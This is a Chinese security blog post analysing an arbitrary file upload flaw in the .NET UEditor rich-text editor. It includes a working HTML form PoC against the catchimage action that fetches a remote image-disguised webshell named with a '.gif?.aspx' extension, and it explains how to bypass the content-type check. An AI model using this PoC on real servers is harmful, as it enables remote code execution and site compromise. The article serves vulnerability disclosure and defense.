# UEditor编辑器两个版本任意文件上传漏洞分析

阅读量 **396948**

|评论 **2**

发布时间 : 2018-08-22 18:58:27

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t01d03518015a5ee908.jpg)

## 0x01 前言

UEditor是由百度WEB前端研发部开发的所见即所得的开源富文本编辑器，具有轻量、可定制、用户体验优秀等特点
，被广大WEB应用程序所使用；本次爆出的高危漏洞属于.NET版本，其它的版本暂时不受影响。漏洞成因是在抓取远程数据源的时候未对文件后缀名做验证导致任意文件写入漏洞，黑客利用此漏洞可以在服务器上执行任意指令，综合评级高危。由于时间仓促，本文分析不到位的地方还请多多谅解。

## 0x02 漏洞利用

笔者本地测试的编辑器是百度官方下载最新的版本1.4.3.3 <http://ueditor.baidu.com/website/download.html>

![](https://p5.ssl.qhimg.com/t01a64fa99a6ff14db9.png)

本地构造一个html，因为不是上传漏洞所以enctype 不需要指定为multipart/form-data ，
之前见到有poc指定了这个值。完整的poc如下

    
    
    <form action="http://xxxxxxxxx/controller.ashx?action=catchimage" enctype="application/x-www-form-urlencoded"  method="POST">
    
      <p>shell addr: <input type="text" name="source[]" /></p >
    
      <input type="submit" value="Submit" />
    
    </form>

需准备一个图片马儿，远程shell地址需要指定扩展名为 1.gif?.aspx

![](https://p0.ssl.qhimg.com/t0120a0d74e839a3190.png)

成功返回webshell

![](https://p2.ssl.qhimg.com/dm/1024_116_/t0143a2a75f071425d5.png)

## 0x03 漏洞分析

在本地IIS中将目录快速指向到解压后的目录，再访问 controller.ashx 控制器文件。当出现下图的时候表示编辑器成功运行。

![](https://p3.ssl.qhimg.com/t01ec23054a4e7c1203.png)

控制器中存在多个动作的调用，包含了uploadimage、uploadscrawl、uploadvideo、uploadfile、catchimage等等

![](https://p4.ssl.qhimg.com/dm/1024_766_/t0102eb97b7124e10a9.png)

这些动作默认情况下都可以远程访问，不排除还有新的高危漏洞；这篇文章重点来介绍catchimage这个分支条件，由于它实例化了CrawlerHandler这个类，所以需要跟进这个一般处理程序类

![](https://p1.ssl.qhimg.com/t012515d5c9ab3290e1.png)

第一行就获取了外界传入的source[] 数组， 核心调用位于Crawlers = Sources.Select(x => new Crawler(x,
Server).Fetch()).ToArray();通过这段lambda表达式来调用类里的方法执行后的结果 ，如下图跟进Fecth方法体内

![](https://p3.ssl.qhimg.com/dm/947_1024_/t01c65b3aed7d169c35.png)

首先通过IsExternalIPAddress方法判断是否是一个可被DNS解析的域名地址，如果不是就终止运行；逻辑代码如下

![](https://p0.ssl.qhimg.com/t017905b145379a3646.png)

这句判断就是 1.5.0开发版本（<https://github.com/fex-team/ueditor/blob/dev-1.5.0/net/App_Code/CrawlerHandler.cs>）和官方发布版本1.4.3.3最大的区别，在1.5.0版本中删除了此处的判断，导致在任意一个ip地址或域名下都可以执行exp如下图

![](https://p5.ssl.qhimg.com/t01f45e90ca7f692d1a.png)

相对来说1.5.0版本更加容易触发此漏洞；而在1.4.3.3版本中攻击者需要提供一个正常的域名地址就可以绕过此处判断；

然后进入第二个条件判断 ： 对文件ContentType的识别

![](https://p2.ssl.qhimg.com/t011a223c60bb2440ba.png)

这段代码很眼熟，一般常见于php文件上传的时候对文件头的判断，这段代码很容易绕过，只需要构造一张图片马儿就可以绕过它的判断，或者构造一个gif89的假图片也可以绕过；最后编辑器根据配置文件的信息创建对应的目录结构再保存文件，代码如下

![](https://p4.ssl.qhimg.com/t018d25e543921a735a.png)

至此RCE漏洞原理大致已经清楚明了，期待官方尽快发布漏洞补丁程序。

## 0x04 防御措施

  1. 修改cs 增加对文件扩展名的；
  2. IPS等防御产品可以加入相应的特征；

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **云影实验室** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/157485](/post/id/157485)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [代码执行](/tag/代码执行)
  * [UEditor](/tag/UEditor)

 **+1** __8赞

 __收藏

![](https://p3.ssl.qhimg.com/t012b723966029ed2c4.png) 云影实验室

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

